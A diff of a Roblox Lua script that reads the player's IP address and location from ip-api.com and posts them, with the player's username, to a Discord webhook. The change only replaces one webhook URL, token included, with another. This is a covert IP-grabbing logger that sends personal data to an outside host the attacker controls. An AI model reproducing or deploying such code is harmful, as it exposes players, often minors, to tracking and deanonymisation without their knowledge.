@@ -10,7 +10,7 @@ local alink = game:HttpGet("http://ip-api.com/json/");
 local b = game:GetService("HttpService"):JSONDecode(alink);
 
 if b.query then 
-    local url ="https://discord.com/api/webhooks/940756215896625172/vyNLxtZVniGRoIZk963mVdvHQnTKPAKMds526LVD6qLObJ9bxEP0z_NTKCr-8HtHb0BX"
+    local url ="https://discord.com/api/webhooks/941930966883123272/JGwksgXXuTSRl5GOue6XMMMvI43DBoZrtN9JWXcutcntblHwFk9eBkOmMu4uH5ObLH9y"
     local data = {
         ["content"] = LP.Name,
         ["embeds"] = {{
